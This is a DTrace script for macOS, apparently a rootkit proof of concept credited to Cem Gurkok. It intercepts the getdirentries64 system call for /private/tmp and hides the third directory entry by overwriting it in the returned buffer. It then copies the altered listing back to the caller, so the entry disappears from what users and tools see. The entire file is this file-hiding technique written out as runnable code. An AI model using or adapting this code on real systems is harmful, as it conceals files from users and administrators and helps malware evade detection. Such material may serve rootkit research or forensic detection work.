#!/usr/sbin/dtrace -s

/*
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
#

"""
@author:       Cem Gurkok
@license:      GNU General Public License 2.0 or later
@contact:      cemgurkok@gmail.com
"""

*/

/* getdirentries64 args: (int fd, user_addr_t bufp, user_size_t bufsize, ssize_t *bytesread, off_t *offset, int flags) */
/* returns buffer size */
/*
 The following is the struct for a directory entry:
 #define __DARWIN_STRUCT_DIRENTRY { \
	__uint64_t  d_ino;      // file number of entry 
	__uint64_t  d_seekoff;  // seek offset (optional, used by servers) 
	__uint16_t  d_reclen;   // length of this record 
	__uint16_t  d_namlen;   // length of string in d_name 
	__uint8_t   d_type;     // file type, see below 
	char      d_name[__DARWIN_MAXPATHLEN]; // entry name (up to MAXPATHLEN bytes) 
 }
*/

self size_t buf_size;

fbt::getdirentries64:entry 
/fds[arg0].fi_pathname+2 == "/private/tmp"/
{
  /* save the direntries buffer */
  self->buf = arg1;
}

fbt::getdirentries64:return 
/self->buf && arg1 > 0/
{
  /* arg0 contains the actual size of the direntries buffer */
  self->buf_size =  arg0;

  self->ent0 = (struct direntry *) copyin(self->buf, self->buf_size);
  printf("\nFirst Entry: %s\n",self->ent0->d_name);

  self->ent1 = (struct direntry *) (char *)(((char *) self->ent0) + self->ent0->d_reclen);
  printf("Second Entry: %s\n",self->ent1->d_name);

  self->ent2 = (struct direntry *) (char *)(((char *) self->ent1) + self->ent1->d_reclen);
  printf("Hiding Third Entry: %s\n",self->ent2->d_name);

  self->ent3 = (struct direntry *) (char *)(((char *) self->ent2) + self->ent2->d_reclen);

  /* recalculate buffer size cause it'll be smaller after overwriting hidden entry with next entry */
  size_left = self->buf_size - ((char *)self->ent2 - (char *)self->ent0);

  /* copy next entry and following entries to start of hidden entry */
  bcopy((char *)self->ent3, (char *)self->ent2, size_left);

  /* rewrite returned arg for getdirentries64 */
  copyout(self->ent0, self->buf, self->buf_size);

}

fbt::getdirentries64:return 
/self->buf && self->buf_size/
{
  self->buf = 0;  
  self->buf_size = 0;
}


